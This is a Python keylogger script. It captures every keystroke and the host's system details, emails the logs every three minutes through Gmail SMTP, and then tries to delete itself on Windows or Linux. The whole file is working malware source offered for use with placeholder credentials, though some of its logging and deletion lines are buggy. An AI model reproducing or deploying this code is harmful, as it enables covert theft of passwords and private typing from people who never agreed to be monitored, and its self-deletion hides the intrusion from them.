import logging 
import os 
import platform 
import smtplib 
import socket
import threading 
import wave 
from pynput import keyboard 
from pynput.keyboard import Listener 
from subprocess import call 
from dotenv import load_dotenv
from subprocess import Popen 

load_dotenv() 
email = os.getenv('EMAIL_ADDRESS') 
password = os.getenv('EMAIL_PASSWORD') 

# CONSTANTS N SHIT 
EMAIL_ADDRESS = "YOUR_ADDRESS" 
EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
SEND_REPORT_EVERY = 180 
class KeyLogger: 
    def __init__(self, time_interval, email, password): 
        self.interval = time_interval 
        self.log = "KeyLogger Started...." 
        self.email = email 
        self.password = password

    def appendlog(self, string): 
        self.log = self.log + string 

    def on_move(self, x, y): 
        current_move = logging.info("Mouse moved to {} {}".format(x, y)) 
        self.appendlog(current_move) 

    def on_click(self, x, y): 
        current_click = logging.info("Mouse moved to {} {}".format(x, y)) 
        self.appendlog(current_click) 

    def on_scroll(self, x, y): 
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y)) 
        self.appendlog(current_scroll) 

    def save_data(self, key): 
        try: 
            current_key = str(key.char) 
        except AttributeError: 
            if key == key.space: 
                current_key = "SPACE" 
            elif key == key.esc: 
                current_key = "ESC" 
            else: 
                current_key = " " + str(key) + " " 

        self.appendlog(current_key) 

    def send_mail(self, email, password, message): 
        server = smtplib.SMTP(host='smtp.gmail.com', port=587) 
        server.starttls() 
        server.login(email, password) 
        server.sendmail(email, email, message) 
        server.quit() 

    def report(self): 
        self.send_mail(self.email, self.password, "\n\n" + self.log) 
        self.log = "" 
        timer = threading.Timer(self.interval, self.report) 
        timer.start() 

    def system_information(self): 
        hostname = socket.gethostname()  
        ip = socket.gethostbyname(hostname) 
        plat = platform.processor() 
        system = platform.system() 
        machine = platform.machine() 
        self.appendlog(hostname) 
        self.appendlog(ip)   
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)


    def run(self): 
        keyboard_listener = keyboard.Listener(on_press=self.save_data) 
        with keyboard_listener: 
            self.report() 
            keyboard_listener.join() 
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener: 
            mouse_listener.join() 
        if os.name == "nt": 
            try: 
                pwd = os.path.abspath(os.getcwd()) 
                os.system("cd " + pwd) 
                os.system("TASKKILL /F /IM " + os.path.basename(__file__)) 
                print('File was closed brodi') 
                os.system("DEL " + os.path.basename(__file__)) 
            except OSError: 
                print('File is closed brodi.') 
        
        else:
            try: 
                pwd = os.path.abspath(os.getcwd()) 
                os.system("cd " + pwd) 
                os.system('pkill leafpad') 
                os.system("chattr -i " + os.path.basename(__file__)) 
                print('File closed brodi....') 
                os.system("rm -rf" + os.path.basename(__file__)) 
            except OSError: 
                print('File terminated brodi....') 

keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run() 

